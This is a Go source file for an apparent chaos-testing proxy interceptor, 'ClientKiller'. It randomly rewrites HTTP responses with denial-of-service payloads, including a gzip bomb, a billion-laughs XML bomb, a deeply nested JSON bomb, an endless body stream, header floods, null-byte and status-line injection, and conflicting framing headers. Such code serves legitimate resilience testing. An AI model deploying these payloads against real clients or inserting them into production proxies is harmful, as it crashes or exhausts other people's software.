package chaos

import (
	"bytes"
	"compress/gzip"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"time"
)

// ClientKiller is a proxy pipeline interceptor that applies destructive
// response modifications designed to crash, hang, or confuse HTTP clients.
// It implements the same class of attacks as the server's error generator
// but applied at the proxy layer to responses in transit.
type ClientKiller struct {
	Probability float64 // overall chance of applying an attack per response
	mu          sync.Mutex
	rng         *rand.Rand
}

// NewClientKiller creates a ClientKiller with the given attack probability.
func NewClientKiller(probability float64) *ClientKiller {
	return &ClientKiller{
		Probability: probability,
		rng:         rand.New(rand.NewSource(time.Now().UnixNano())),
	}
}

// Name returns the interceptor name.
func (ck *ClientKiller) Name() string {
	return "chaos/clientkill"
}

// InterceptRequest is a no-op — client killing only affects responses.
func (ck *ClientKiller) InterceptRequest(req *http.Request) (*http.Request, error) {
	return req, nil
}

// clientKillAttack defines an individual attack function.
type clientKillAttack struct {
	name   string
	weight float64 // relative probability weight
	apply  func(resp *http.Response) *http.Response
}

// InterceptResponse applies a destructive modification to the response.
func (ck *ClientKiller) InterceptResponse(resp *http.Response) (*http.Response, error) {
	ck.mu.Lock()
	shouldAttack := ck.rng.Float64() < ck.Probability
	if !shouldAttack {
		ck.mu.Unlock()
		return resp, nil
	}

	attacks := ck.allAttacks()
	totalWeight := 0.0
	for _, a := range attacks {
		totalWeight += a.weight
	}
	roll := ck.rng.Float64() * totalWeight
	ck.mu.Unlock()

	cumulative := 0.0
	for _, a := range attacks {
		cumulative += a.weight
		if roll < cumulative {
			return a.apply(resp), nil
		}
	}

	return resp, nil
}

// allAttacks returns all available client-killing attack functions.
func (ck *ClientKiller) allAttacks() []clientKillAttack {
	return []clientKillAttack{
		// --- Body replacement bombs ---
		{"gzip_bomb", 1.0, ck.attackGzipBomb},
		{"xml_bomb", 1.0, ck.attackXMLBomb},
		{"json_depth_bomb", 1.0, ck.attackJSONDepthBomb},

		// --- Header attacks ---
		{"header_null_bytes", 1.5, ck.attackHeaderNullBytes},
		{"header_flood", 1.0, ck.attackHeaderFlood},
		{"header_obs_fold", 0.5, ck.attackHeaderObsFold},

		// --- Encoding confusion ---
		{"false_compression", 1.0, ck.attackFalseCompression},
		{"multi_encodings", 1.0, ck.attackMultiEncodings},
		{"double_gzip", 1.0, ck.attackDoubleGzip},
		{"both_cl_and_te", 1.0, ck.attackBothCLAndTE},

		// --- Content-Length mismatch ---
		{"cl_too_large", 1.5, ck.attackCLTooLarge},
		{"cl_too_small", 1.0, ck.attackCLTooSmall},
		{"cl_negative", 0.5, ck.attackCLNegative},

		// --- Content-Type confusion ---
		{"wrong_content_type", 0.5, ck.attackWrongContentType},

		// --- Body corruption ---
		{"truncate_json", 1.0, ck.attackTruncateJSON},
		{"garbage_inject", 1.0, ck.attackGarbageInject},
		{"infinite_body", 1.0, ck.attackInfiniteBody},

		// --- Protocol confusion ---
		{"status_line_corrupt", 0.5, ck.attackStatusLineCorrupt},
		{"chunk_overflow_header", 1.0, ck.attackChunkOverflowHeader},
	}
}

// --- Body replacement bombs ---

func (ck *ClientKiller) attackGzipBomb(resp *http.Response) *http.Response {
	discardBody(resp)

	var buf bytes.Buffer
	gzw, err := gzip.NewWriterLevel(&buf, gzip.BestCompression)
	if err != nil {
		return resp
	}
	// 10MB of zeros compresses to ~10KB
	chunk := make([]byte, 65536)
	for i := 0; i < 160; i++ {
		if _, err := gzw.Write(chunk); err != nil {
			break
		}
	}
	gzw.Close()

	resp.Header.Set("Content-Encoding", "gzip")
	resp.Header.Set("Content-Type", "text/html")
	resp.Body = io.NopCloser(bytes.NewReader(buf.Bytes()))
	resp.ContentLength = int64(buf.Len())
	resp.StatusCode = 200
	resp.Status = "200 OK"
	return resp
}

func (ck *ClientKiller) attackXMLBomb(resp *http.Response) *http.Response {
	discardBody(resp)

	bomb := `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>`

	resp.Header.Set("Content-Type", "application/xml")
	resp.Body = io.NopCloser(strings.NewReader(bomb))
	resp.ContentLength = int64(len(bomb))
	resp.StatusCode = 200
	resp.Status = "200 OK"
	return resp
}

func (ck *ClientKiller) attackJSONDepthBomb(resp *http.Response) *http.Response {
	discardBody(resp)

	depth := 100000
	var b strings.Builder
	b.Grow(depth*2 + 50)
	for i := 0; i < depth; i++ {
		b.WriteString(`{"a":`)
	}
	b.WriteString(`"boom"`)
	for i := 0; i < depth; i++ {
		b.WriteByte('}')
	}
	body := b.String()

	resp.Header.Set("Content-Type", "application/json")
	resp.Body = io.NopCloser(strings.NewReader(body))
	resp.ContentLength = int64(len(body))
	resp.StatusCode = 200
	resp.Status = "200 OK"
	return resp
}

// --- Header attacks ---

func (ck *ClientKiller) attackHeaderNullBytes(resp *http.Response) *http.Response {
	// Inject null bytes into header values — crashes many HTTP client parsers
	resp.Header.Set("X-Glitch", "before\x00after")
	resp.Header.Set("X-Data", "null\x00byte\x00header")
	resp.Header.Set("Server", "Apache\x00Nginx\x00IIS")
	return resp
}

func (ck *ClientKiller) attackHeaderFlood(resp *http.Response) *http.Response {
	// Add hundreds of headers — overwhelms client header parsing/storage
	for i := 0; i < 500; i++ {
		resp.Header.Add(fmt.Sprintf("X-Flood-%04d", i), strings.Repeat("H", 200))
	}
	return resp
}

func (ck *ClientKiller) attackHeaderObsFold(resp *http.Response) *http.Response {
	// Obsolete header folding — confuses modern parsers that don't handle RFC 7230 obs-fold
	resp.Header.Set("X-Folded", "start of value\r\n continued on next line\r\n and another")
	return resp
}

// --- Encoding confusion ---

func (ck *ClientKiller) attackFalseCompression(resp *http.Response) *http.Response {
	// Claim brotli encoding but send uncompressed — clients that try to decompress will crash
	resp.Header.Set("Content-Encoding", "br")
	return resp
}

func (ck *ClientKiller) attackMultiEncodings(resp *http.Response) *http.Response {
	// Conflicting Content-Encoding values
	resp.Header.Set("Content-Encoding", "gzip")
	resp.Header.Add("Content-Encoding", "deflate")
	resp.Header.Add("Content-Encoding", "identity")
	return resp
}

func (ck *ClientKiller) attackDoubleGzip(resp *http.Response) *http.Response {
	// Claim gzip but send raw body — decoders will choke
	resp.Header.Set("Content-Encoding", "gzip")
	// Don't actually gzip the body — leave it as-is
	return resp
}

func (ck *ClientKiller) attackBothCLAndTE(resp *http.Response) *http.Response {
	// Ambiguous message framing (RFC 7230 violation) — clients must choose one
	resp.Header.Set("Transfer-Encoding", "chunked")
	if resp.ContentLength > 0 {
		resp.Header.Set("Content-Length", fmt.Sprintf("%d", resp.ContentLength))
	} else {
		resp.Header.Set("Content-Length", "99999")
	}
	return resp
}

// --- Content-Length mismatch ---

func (ck *ClientKiller) attackCLTooLarge(resp *http.Response) *http.Response {
	// Claim body is much larger than it is — client will wait forever for remaining bytes
	body := readBody(resp)
	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(body)+1000000))
	resp.Body = io.NopCloser(bytes.NewReader(body))
	resp.ContentLength = int64(len(body) + 1000000)
	return resp
}

func (ck *ClientKiller) attackCLTooSmall(resp *http.Response) *http.Response {
	// Claim body is smaller than it is — client truncates response
	body := readBody(resp)
	if len(body) > 10 {
		resp.Header.Set("Content-Length", "5")
		resp.ContentLength = 5
	}
	resp.Body = io.NopCloser(bytes.NewReader(body))
	return resp
}

func (ck *ClientKiller) attackCLNegative(resp *http.Response) *http.Response {
	// Negative Content-Length — undefined behavior in many parsers
	resp.Header.Set("Content-Length", "-1")
	resp.ContentLength = -1
	return resp
}

// --- Content-Type confusion ---

func (ck *ClientKiller) attackWrongContentType(resp *http.Response) *http.Response {
	wrongTypes := []string{
		"application/octet-stream", "image/png", "audio/mpeg",
		"video/mp4", "application/pdf", "multipart/form-data",
	}
	ck.mu.Lock()
	idx := ck.rng.Intn(len(wrongTypes))
	ck.mu.Unlock()
	resp.Header.Set("Content-Type", wrongTypes[idx])
	return resp
}

// --- Body corruption ---

func (ck *ClientKiller) attackTruncateJSON(resp *http.Response) *http.Response {
	body := readBody(resp)
	if len(body) > 20 {
		// Cut at ~60% — leaves JSON/HTML unclosed
		cut := len(body) * 6 / 10
		body = body[:cut]
	}
	resp.Body = io.NopCloser(bytes.NewReader(body))
	resp.ContentLength = int64(len(body))
	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(body)))
	return resp
}

func (ck *ClientKiller) attackGarbageInject(resp *http.Response) *http.Response {
	body := readBody(resp)
	// Inject random garbage bytes into the middle of the response
	garbage := make([]byte, 512)
	ck.mu.Lock()
	for i := range garbage {
		garbage[i] = byte(ck.rng.Intn(256))
	}
	ck.mu.Unlock()

	if len(body) > 10 {
		mid := len(body) / 2
		result := make([]byte, 0, len(body)+len(garbage))
		result = append(result, body[:mid]...)
		result = append(result, garbage...)
		result = append(result, body[mid:]...)
		body = result
	} else {
		body = append(body, garbage...)
	}
	resp.Body = io.NopCloser(bytes.NewReader(body))
	resp.ContentLength = int64(len(body))
	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(body)))
	return resp
}

func (ck *ClientKiller) attackInfiniteBody(resp *http.Response) *http.Response {
	discardBody(resp)

	// Replace body with a reader that never ends — streams padding forever
	resp.Header.Set("Content-Type", "text/html")
	resp.Header.Del("Content-Length")
	resp.ContentLength = -1
	resp.Body = io.NopCloser(&infiniteReader{})
	return resp
}

// --- Protocol confusion ---

func (ck *ClientKiller) attackStatusLineCorrupt(resp *http.Response) *http.Response {
	// Corrupt the status line — some clients parse this manually
	resp.Status = "200\x00OK\r\nInjected: evil"
	resp.StatusCode = 200
	return resp
}

func (ck *ClientKiller) attackChunkOverflowHeader(resp *http.Response) *http.Response {
	// Add Transfer-Encoding: chunked with absurd chunk size marker in a custom header
	// This confuses clients that inspect headers for chunked handling
	resp.Header.Set("Transfer-Encoding", "chunked")
	resp.Header.Set("X-Chunk-Size", "FFFFFFFFFFFFFFFF")
	return resp
}

// --- Helpers ---

func discardBody(resp *http.Response) {
	if resp.Body != nil {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

func readBody(resp *http.Response) []byte {
	if resp.Body == nil {
		return nil
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	return body
}

// infiniteReader produces padding data that never ends.
type infiniteReader struct {
	count int
}

func (r *infiniteReader) Read(p []byte) (int, error) {
	padding := fmt.Sprintf("<!-- keep-alive padding %d -->\n", r.count)
	r.count++
	n := copy(p, padding)
	return n, nil
}
